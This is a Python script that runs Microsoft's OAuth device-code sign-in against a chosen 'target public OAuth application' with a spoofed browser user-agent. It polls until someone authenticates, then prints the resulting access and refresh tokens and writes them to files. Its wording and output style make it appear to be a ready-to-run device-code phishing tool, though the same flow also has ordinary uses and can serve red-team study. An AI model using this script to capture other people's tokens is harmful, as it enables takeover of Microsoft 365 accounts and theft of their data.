import requests, argparse, datetime, time

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--resource', required=False, default='graph.microsoft.com', metavar='graph.microsoft.com', help='Resource to request access to (default is graph.microsoft.com)')
parser.add_argument('-c', '--client_id', required=False, default='d3590ed6-52b3-4102-aeff-aad2292ab01c', metavar='d3590ed6-52b3-4102-aeff-aad2292ab01c', help='The client ID of the target public OAuth application (default: d3590ed6-52b3-4102-aeff-aad2292ab01c)')
args = parser.parse_args()
resource = 'https://' + args.resource
resource_filename = args.resource.replace(".", "_")
client_id = args.client_id


def saveTokenToDisk(filename, token):
    f = open(filename, 'w')
    f.write(token)
    f.close()

usercode_url = 'https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0'
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'}
usercode_payload = {'client_id': client_id,
                    'resource': resource}

usercode_response = requests.post(usercode_url, headers=headers, data=usercode_payload)

if usercode_response.status_code == 200:
    usercode_data = usercode_response.json()
    user_code = usercode_data['user_code']
    device_code = usercode_data['device_code']
    expires = usercode_data['expires_in']
    interval = usercode_data['interval']
    print(f'[*] User code: {user_code}')
    usercode_lifespan = datetime.datetime.now() + datetime.timedelta(seconds=int(expires))
    print(f'[*] User code expires at: {usercode_lifespan}')
else:
    print('[!] Something went wrong getting an initial user / device code.')


auth_url = 'https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0'
auth_payload = {'client_id': client_id,
                'resource': resource,
                'code': device_code,
                'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'}


# Poll Microsoft for user authentication
# TODO: Handle the expected response errors better (https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code#expected-errors)
def checkUserCodeAuth():
    time = datetime.datetime.now()
    time.strftime('%H:%M:%S')
    auth_response = requests.post(auth_url, headers=headers, data=auth_payload)
    auth_data = auth_response.json()
    if auth_response.status_code == 200:
        print('[+] User successfully authenticated!')
        auth_scope = auth_data['scope']
        auth_accesstoken = auth_data['access_token']
        auth_freshtoken = auth_data['refresh_token']
        auth_resource = auth_data['resource']
        print(f'[+] Scope: {auth_scope}\n[+] Resource: {auth_resource}\n[+] Access Token: {auth_accesstoken} \n[+] Refresh Token: {auth_freshtoken}')
        saveTokenToDisk(resource_filename + '_accesstoken.txt', auth_accesstoken)
        saveTokenToDisk(resource_filename + '_refreshtoken.txt', auth_freshtoken)
        print(f'[+] Access token saved to: {resource_filename}_accesstoken.txt\n[+] Refresh token saved to: {resource_filename}_refreshtoken.txt')
        return False
    elif auth_response.status_code == 400:
        auth_error = auth_data['error']
        print(f'[*] Status: {auth_error} at {time.hour:02d}:{time.minute:02d}:{time.second:02d}', end='\r')
        return True

print('[*] Polling Microsoft for user authentication...')

def main():
    # Loop while authorisation is pending or until timeout exceeded
    while True:
        try:
            if datetime.datetime.now() >= usercode_lifespan:
                print('[!] The user code has expired!')
                break
            if not checkUserCodeAuth():
                break
            time.sleep(int(interval))

        except KeyboardInterrupt:
                exit(0)


if __name__ == '__main__':
    main()